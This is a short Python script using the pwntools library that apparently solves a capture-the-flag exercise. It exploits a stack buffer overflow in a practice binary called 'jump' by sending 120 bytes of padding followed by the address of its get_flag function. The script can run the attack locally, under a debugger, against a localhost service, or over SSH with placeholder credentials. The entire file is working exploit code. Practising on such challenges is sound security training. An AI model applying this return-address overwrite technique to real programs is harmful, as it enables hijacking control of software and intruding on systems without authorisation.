#!/usr/bin/python3

from pwn import *

context.terminal = ['konsole','-e'] # replace this with your terminal of choice
#context.log_level = 'debug'
context.binary = './build/jump'

e = ELF('./build/jump')
rop = ROP('./build/jump')
if 'd' in sys.argv:
    p = e.debug()
elif 'r' in sys.argv:
    p = remote('localhost', 5000)
elif 's' in sys.argv:
    s = ssh(host='host', user='username', password='password')
    p = s.process('./build/jump', cwd='problemDir')
else:
    p = e.process()

payload = flat({120: e.sym['get_flag']})

p.sendline(payload)
p.interactive()
